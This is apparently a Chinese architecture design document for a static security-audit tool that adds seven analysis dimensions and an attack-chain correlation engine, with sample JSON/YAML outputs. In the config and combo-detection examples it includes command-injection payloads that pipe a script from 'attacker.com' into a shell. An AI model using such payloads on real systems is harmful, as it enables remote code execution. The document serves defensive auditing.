# 多维度攻击面分析架构设计

## 概述

在现有的三维切分（路由维度、权限维度、风险类型维度）基础上，补充7个新维度，实现立体化攻击面覆盖。

## 架构原则

1. **分层设计**：维度分析技能 → 组合检测引擎 → 编排器协调
2. **向后兼容**：不破坏现有40+个analyzer的工作方式
3. **渐进增强**：各维度技能独立工作，组合检测作为增强层
4. **标准输出**：统一JSON格式，便于后续分析和关联

---

## 维度技能架构

### 第一层：基础维度技能（现有）

```
路由维度 → unauth-route-scanner / normal-route-scanner
权限维度 → web-auth-analyzer
风险类型维度 → 40+ SecSkills analyzers
```

### 第二层：新增维度技能（待实现）

```
┌─────────────────────────────────────────────────────────┐
│          7个新增攻击面维度                                │
├─────────────────────────────────────────────────────────┤
│ 1. dataflow-analyzer           数据流向追踪              │
│ 2. trust-boundary-analyzer     信任边界穿越检测           │
│ 3. state-machine-analyzer      状态机/生命周期分析        │
│ 4. config-env-analyzer         配置/环境攻击面            │
│ 5. error-boundary-analyzer     异常/边界条件分析          │
│ 6. temporal-analyzer           时间维度漏洞               │
│ 7. dependency-analyzer         组件/供应链扫描            │
└─────────────────────────────────────────────────────────┘
```

### 第三层：组合检测引擎

```
combo-pattern-analyzer
├── 攻击链模板库
├── 数据流关联引擎
├── 多条件叠加检测
└── 时序竞态分析
```

---

## 详细设计方案

## 维度1: 数据流向维度 (dataflow-analyzer)

### 核心功能
- Source 识别：用户输入点、配置参数、数据库读取、缓存读取
- Sink 识别：危险函数（exec、query、eval、readFile）
- 污点追踪：正向追踪 + 反向追溯
- 二阶攻击检测：存储→读取→使用的延迟攻击

### 输入
```json
{
  "source": "项目根目录",
  "scope": "全局 | 特定文件列表",
  "focus_sinks": ["exec", "query", "eval"]  // 可选：关注特定Sink
}
```

### 输出
```json
{
  "dataflows": [
    {
      "id": "df-001",
      "source": {
        "type": "user_input",
        "location": "src/api/user.js:45",
        "variable": "req.body.username"
      },
      "sink": {
        "type": "sql_query",
        "location": "src/db/user.js:120",
        "function": "db.query"
      },
      "path": [
        "req.body.username → validateUser() → getUserByName() → db.query()"
      ],
      "sanitization": [],
      "risk": "HIGH",
      "vulnerability": "SQL Injection"
    }
  ],
  "statistics": {
    "total_sources": 45,
    "total_sinks": 23,
    "dangerous_paths": 12,
    "second_order_attacks": 3
  }
}
```

### 实现策略
```python
# 1. 识别所有Source
sources = [
    "req.body.*", "req.query.*", "req.params.*",  # HTTP输入
    "config.*", "process.env.*",                   # 配置/环境
    "db.findOne()", "redis.get()",                 # 数据库/缓存
    "fs.readFileSync()", "JSON.parse()"            # 文件/序列化
]

# 2. 识别所有Sink
sinks = [
    "exec", "spawn", "eval",              # 命令/代码执行
    "db.query", "db.raw",                 # SQL查询
    "fs.readFile", "fs.writeFile",        # 文件操作
    "http.request", "fetch"               # 网络请求
]

# 3. 追踪数据流
for source in sources:
    for sink in sinks:
        paths = taint_analysis(source, sink)
        if paths and not has_sanitization(paths):
            report_dataflow_vulnerability(source, sink, paths)
```

---

## 维度2: 信任边界穿越维度 (trust-boundary-analyzer)

### 核心功能
- 边界识别：前端↔后端、用户态↔内核态、服务A↔服务B、应用↔数据库
- 穿越点检测：跨边界的数据传递位置
- 验证缺失检查：边界穿越时是否有足够的验证/转义

### 信任边界定义
```yaml
boundaries:
  - name: "前端→后端"
    required_checks:
      - type_validation
      - length_limit
      - format_validation
    examples:
      - "req.body → controller"
      - "formData → API endpoint"

  - name: "服务间调用"
    required_checks:
      - authentication
      - signature_validation
      - parameter_validation
    examples:
      - "ServiceA.call(ServiceB)"
      - "RPC request"

  - name: "缓存→业务逻辑"
    required_checks:
      - data_integrity
      - expiration_check
      - type_validation
    examples:
      - "redis.get() → business logic"
      - "memcached → auth check"

  - name: "ORM→原生SQL"
    required_checks:
      - parameterized_query
      - escape_check
    examples:
      - "User.find() → db.query()"
      - "QueryBuilder → raw SQL"
```

### 输出
```json
{
  "boundary_crossings": [
    {
      "id": "bc-001",
      "boundary": "缓存→业务逻辑",
      "source": "redis.get('user:' + userId)",
      "target": "db.query(`DELETE FROM ... WHERE id=${cachedData.id}`)",
      "location": "src/cache/user.js:67 → src/api/admin.js:234",
      "missing_checks": [
        "data_integrity",
        "type_validation"
      ],
      "risk": "CRITICAL",
      "description": "缓存数据未经验证直接用于SQL查询，可能导致二阶SQL注入"
    }
  ]
}
```

---

## 维度3: 状态机/生命周期维度 (state-machine-analyzer)

### 核心功能
- 状态机提取：从代码中识别订单、会话、审批等状态流转
- 状态跳转检测：检查是否可以跳过关键步骤
- 时序攻击检测：TOCTOU、并发竞态
- 回滚/补偿检查：分布式事务的一致性

### 状态机定义
```yaml
state_machines:
  - name: "订单状态"
    states:
      - created
      - pending_payment
      - paid
      - shipped
      - completed
      - cancelled
    transitions:
      - from: created
        to: pending_payment
        required_checks: ["order_validation"]

      - from: pending_payment
        to: paid
        required_checks: ["payment_verification", "signature_check"]
        critical: true  # 关键步骤，不能跳过

      - from: paid
        to: shipped
        required_checks: ["inventory_check", "address_validation"]

    vulnerabilities:
      - type: "状态跳转绕过"
        check: "是否存在未检查前置状态的跳转"

      - type: "并发竞态"
        check: "状态转换是否有锁/事务保护"
```

### 输出
```json
{
  "state_machines": [
    {
      "name": "订单状态机",
      "location": "src/models/order.js",
      "states": ["created", "pending_payment", "paid", "shipped"],
      "vulnerabilities": [
        {
          "type": "状态跳转绕过",
          "description": "可以直接从 created 跳转到 shipped，跳过支付步骤",
          "location": "src/api/order.js:156",
          "code": "order.status = req.body.status",
          "missing_check": "未验证前置状态",
          "risk": "CRITICAL"
        }
      ]
    }
  ]
}
```

---

## 维度4: 配置/环境维度 (config-env-analyzer)

### 核心功能
- 配置参数识别：从配置文件、环境变量、UI表单提取
- 配置→系统操作追踪：配置参数传递到危险函数的路径
- 环境差异检测：开发/测试/生产环境的配置差异
- Feature Flag 检测：条件启用的隐藏接口

### 配置来源
```yaml
config_sources:
  - type: "配置文件"
    patterns:
      - "*.json"
      - "*.yaml"
      - "*.env"
      - "config/*.js"

  - type: "UI表单配置"
    patterns:
      - "workflow config"
      - "plugin settings"
      - "admin panel settings"

  - type: "环境变量"
    patterns:
      - "process.env.*"
      - "os.getenv()"
      - "System.getenv()"

  - type: "Feature Flags"
    patterns:
      - "if (featureEnabled(...))"
      - "@ConditionalOnProperty"
      - "if (DEBUG)"
```

### 输出
```json
{
  "config_to_sink_paths": [
    {
      "config_source": {
        "type": "workflow_config",
        "parameter": "git_branch",
        "location": "workflow.json:45"
      },
      "sink": {
        "type": "command_execution",
        "function": "exec",
        "location": "src/nodes/git.js:78"
      },
      "path": "config.branch → executeGitCommand() → exec(`git clone -b ${branch}`)",
      "vulnerability": "Command Injection via Config",
      "risk": "CRITICAL",
      "example_payload": "main; curl attacker.com/shell.sh | sh;"
    }
  ],
  "environment_differences": [
    {
      "config": "DEBUG",
      "dev": true,
      "prod": false,
      "risk": "DEBUG mode enables /debug/* endpoints in production"
    }
  ]
}
```

---

## 维度5: 错误处理/边界条件维度 (error-boundary-analyzer)

### 核心功能
- 异常分支检测：try-catch、错误回调中的安全检查缺失
- 边界值测试：0, -1, null, undefined, MAX_INT
- 降级逻辑检测：服务降级时的安全缺陷
- 错误信息泄露：堆栈信息、路径泄露

### 检测模式
```yaml
error_patterns:
  - name: "异常分支缺少权限检查"
    pattern: |
      try {
        check_permission()
        sensitive_operation()
      } catch (e) {
        // ❌ 直接执行降级操作，未检查权限
        fallback_operation()
      }
    risk: "HIGH"

  - name: "边界值未处理"
    pattern: |
      function withdraw(amount) {
        // ❌ 未检查 amount 是否为负数
        balance -= amount
      }
    test_values: [0, -1, -999999, null, undefined, Infinity]
    risk: "MEDIUM"

  - name: "错误信息泄露"
    pattern: |
      catch (e) {
        res.send(e.message)  // ❌ 泄露SQL错误、文件路径
      }
    risk: "LOW"
```

### 输出
```json
{
  "error_handling_issues": [
    {
      "type": "异常分支缺少权限检查",
      "location": "src/api/admin.js:145",
      "code_snippet": "catch(e) { fallbackOperation() }",
      "issue": "异常处理中直接执行敏感操作，未验证权限",
      "risk": "HIGH"
    }
  ],
  "boundary_value_issues": [
    {
      "function": "withdraw",
      "location": "src/wallet.js:67",
      "issue": "未检查负数金额，可能导致余额增加",
      "test_payload": "amount: -1000",
      "risk": "CRITICAL"
    }
  ]
}
```

---

## 维度6: 时间维度 (temporal-analyzer)

### 核心功能
- Token过期检测：JWT、Session过期时间验证
- 竞态窗口分析：TOCTOU攻击窗口
- 缓存失效时机：缓存投毒机会窗口
- 定时任务权限：Cron、异步任务的权限检查
- 重放攻击检测：时间戳/nonce验证

### 检测维度
```yaml
temporal_vulnerabilities:
  - name: "Token过期未验证"
    check: |
      - 是否检查 exp 字段
      - 过期后是否拒绝访问
      - 是否有刷新机制

  - name: "竞态窗口"
    pattern: |
      check_condition()    // T1
      // 竞态窗口
      execute_operation()  // T2
    risk: "TOCTOU攻击"

  - name: "重放攻击"
    check: |
      - 是否验证时间戳
      - 是否检查 nonce
      - 请求是否幂等
```

### 输出
```json
{
  "temporal_vulnerabilities": [
    {
      "type": "TOCTOU竞态条件",
      "location": "src/payment.js:89-102",
      "time_window": "13 lines / ~50ms",
      "vulnerable_sequence": [
        "L89: check_balance()",
        "L95: calculate_fee()",
        "L102: deduct_balance()"
      ],
      "attack_scenario": "并发请求可在检查后、扣费前修改余额",
      "risk": "HIGH"
    }
  ]
}
```

---

## 维度7: 组件/依赖维度 (dependency-analyzer)

### 核心功能
- CVE扫描：检测已知漏洞（log4j、fastjson、Spring4Shell）
- 版本过期检测：框架、中间件版本
- 传递依赖分析：A→B→C，C有漏洞
- 供应链风险：npm/PyPI恶意包检测

### 数据源
```yaml
vulnerability_databases:
  - NVD (National Vulnerability Database)
  - Snyk
  - GitHub Advisory Database
  - OWASP Dependency-Check

package_managers:
  - npm (package.json, package-lock.json)
  - pip (requirements.txt, Pipfile.lock)
  - maven (pom.xml)
  - gradle (build.gradle)
  - go.mod
```

### 输出
```json
{
  "vulnerabilities": [
    {
      "package": "log4j-core",
      "version": "2.14.1",
      "cve": "CVE-2021-44228",
      "severity": "CRITICAL",
      "cvss": 10.0,
      "description": "Log4Shell RCE",
      "affected_files": [
        "pom.xml:45"
      ],
      "fix_version": "2.17.1",
      "exploit_available": true
    }
  ],
  "outdated_packages": [
    {
      "package": "express",
      "current": "4.16.0",
      "latest": "4.18.2",
      "known_vulnerabilities": 3
    }
  ]
}
```

---

## 第三层：组合检测引擎 (combo-pattern-analyzer)

### 核心功能
- 加载攻击链模板库（Spring4Shell、Log4Shell等）
- 关联多个维度的扫描结果
- 检测多条件叠加漏洞
- 生成攻击路径图

### 攻击链模板
```yaml
attack_chains:
  - name: "Spring4Shell"
    pattern: "串行组合"
    chain:
      - dimension: "config-env"
        finding: "mass_assignment_enabled"

      - dimension: "dataflow"
        finding: "config → classLoader"

      - dimension: "trust-boundary"
        finding: "classLoader → file_write"

    verdict:
      severity: "CRITICAL"
      title: "Spring4Shell RCE"

  - name: "n8n Git Node RCE"
    pattern: "串行组合"
    chain:
      - dimension: "config-env"
        finding: "workflow_config.branch"

      - dimension: "dataflow"
        finding: "config.branch → exec()"

      - dimension: "trust-boundary"
        finding: "config → command_execution (未转义)"

    verdict:
      severity: "CRITICAL"
      title: "Config-driven Command Injection"
```

### 输出
```json
{
  "combo_vulnerabilities": [
    {
      "pattern": "n8n Git Node RCE",
      "chain": [
        {
          "dimension": "config-env-analyzer",
          "finding": "workflow_config.branch 参数可控",
          "location": "workflow.json:34"
        },
        {
          "dimension": "dataflow-analyzer",
          "finding": "config.branch → executeGitCommand()",
          "path": "df-045"
        },
        {
          "dimension": "trust-boundary-analyzer",
          "finding": "配置→命令执行边界缺少转义",
          "location": "src/nodes/git.js:78"
        }
      ],
      "severity": "CRITICAL",
      "poc": "branch: 'main; curl attacker.com/shell | sh;'",
      "impact": "普通用户可通过工作流配置执行任意系统命令"
    }
  ]
}
```

---

## 编排器集成方案

### 更新 security-orchestrator.md

```markdown
## 执行流程（新版）

### Phase 1: 基础维度扫描
- workspace-scanner
- project-profiler
- web-auth-analyzer
- route-scanner

### Phase 2: 风险类型扫描（现有）
- 40+ SecSkills analyzers

### Phase 3: 新增维度扫描（新）
- dataflow-analyzer
- trust-boundary-analyzer
- state-machine-analyzer
- config-env-analyzer
- error-boundary-analyzer
- temporal-analyzer
- dependency-analyzer

### Phase 4: 组合检测（新）
- combo-pattern-analyzer
  - 输入：Phase 1-3 的所有扫描结果
  - 输出：组合漏洞报告

### Phase 5: 报告生成
- report-generator
  - 合并所有维度的发现
  - 按严重程度排序
  - 生成 audit-report.md + audit-report.json
```

---

## 实施优先级

### P0 (高优先级，先实现)
1. ✅ **dataflow-analyzer** - 最关键，覆盖80%的注入类漏洞
2. ✅ **config-env-analyzer** - 发现隐藏的攻击面
3. ✅ **combo-pattern-analyzer** - 检测复杂漏洞

### P1 (中优先级)
4. **trust-boundary-analyzer** - 发现信任传递缺陷
5. **state-machine-analyzer** - 业务逻辑漏洞
6. **dependency-analyzer** - 供应链安全

### P2 (可后续补充)
7. **error-boundary-analyzer** - 异常处理缺陷
8. **temporal-analyzer** - 时序相关漏洞

---

## 输出格式标准

所有维度技能必须输出标准JSON格式：

```json
{
  "dimension": "dataflow | trust-boundary | state-machine | ...",
  "findings": [
    {
      "id": "唯一标识",
      "type": "漏洞类型",
      "severity": "CRITICAL | HIGH | MEDIUM | LOW | INFO",
      "location": "文件:行号",
      "description": "详细描述",
      "poc": "PoC示例"
    }
  ],
  "statistics": {
    "total_checks": 100,
    "vulnerabilities": 5
  },
  "tasks": []  // 下游任务推荐（如适用）
}
```

---

## 兼容性保障

1. **向后兼容**：现有40+个analyzer无需修改
2. **渐进增强**：新维度技能可单独启用/禁用
3. **标准接口**：所有技能统一通过skill-runner调用
4. **独立部署**：各维度技能互不依赖，可并行执行

---

## 下一步行动

1. ✅ 完成架构设计文档（本文档）
2. 实现 P0 优先级技能（dataflow、config-env、combo-pattern）
3. 更新 security-orchestrator 编排逻辑
4. 编写测试用例验证功能
5. 补充 P1、P2 技能
